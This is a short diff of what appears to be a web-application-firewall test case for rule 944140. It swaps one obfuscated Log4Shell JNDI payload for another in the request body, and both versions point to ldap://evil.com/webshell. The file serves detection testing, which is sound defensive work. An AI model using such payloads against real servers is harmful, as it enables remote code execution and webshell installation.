@@ -115,7 +115,7 @@
               method: POST
               port: 80
               uri: /
-              data: foo=${${::-j}${::-n}${::-d}${::-i}:ldap://evil.com/webshell}
+              data: foo=$${env:something:-${env:something:-$}{jndi:ldap://evil.com/webshell}}}
             output:
               log_contains: "id \"944140\""
     -
